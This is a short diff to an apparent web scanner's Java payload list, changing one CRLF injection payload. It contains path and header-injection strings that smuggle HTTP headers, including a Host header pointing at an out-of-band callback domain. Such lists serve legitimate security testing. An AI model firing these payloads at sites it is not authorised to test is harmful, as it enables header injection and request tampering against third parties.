@@ -71,7 +71,7 @@ public class PayloadConstants {
             new PayloadInfo("{path1}{path2}", "{path1}{path2}"),
             new PayloadInfo("{path}..", "{path}.."),
             new PayloadInfo("{path}/%20H", "ng crlf"),
-            new PayloadInfo("{path}/%20HTTP/19.91%0D%0AX:%20x", "ng crlf2"),
+            new PayloadInfo("{path}/%20HTTP/19.91%0D%0Ac9w:%20x", "ng crlf2"),
             new PayloadInfo("{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%209", "ng crlf3"),
             new PayloadInfo("{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%204", "{path}CRLF"),
             new PayloadInfo("{path}/chaxx", "{path}/chaxx"),
